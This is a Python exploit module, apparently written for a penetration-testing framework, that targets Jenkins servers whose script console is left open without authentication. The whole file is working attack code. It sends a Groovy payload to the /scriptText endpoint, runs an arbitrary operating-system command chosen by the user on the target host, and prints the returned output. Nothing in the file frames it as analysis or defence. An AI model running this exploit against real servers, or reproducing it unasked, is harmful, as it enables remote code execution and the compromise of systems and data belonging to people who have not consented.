import requests
from core.base_module import BaseModule
from rich.console import Console

class JenkinsRce(BaseModule):
    """Executes a command on Jenkins via the script console (unauthenticated)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [8080, 'The target port.'],
            'CMD': ['whoami', 'The command to execute on the target.']
        }

    def run(self, options):
        """
        Executes the Jenkins RCE exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        url = f"http://{rhost}:{rport}/scriptText"
        console.print(f"[*] Targeting Jenkins script console at: {url}")

        # Groovy script payload to execute a command
        groovy_script = f'println "{cmd}".execute().text'
        data = {
            'script': groovy_script
        }

        try:
            console.print(f"[*] Sending Groovy payload to execute: {cmd}")
            response = requests.post(url, data=data, timeout=20)

            if response.status_code == 200:
                # Successful execution usually returns the output in the body
                output = response.text.strip()
                console.print("[bold green][+] Command executed successfully![/bold green]")
                console.print(f"--- Command Output ---\n{output}\n----------------------")
            elif response.status_code == 403:
                console.print("[yellow][-] Access denied. The script console likely requires authentication.[/yellow]")
            elif response.status_code == 404:
                console.print("[yellow][-] Script console not found at the specified URL.[/yellow]")
            else:
                console.print(f"[!] Received unexpected status code: {response.status_code}", style="bold red")
                console.print(f"Response: {response.text[:200]}")

        except requests.exceptions.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
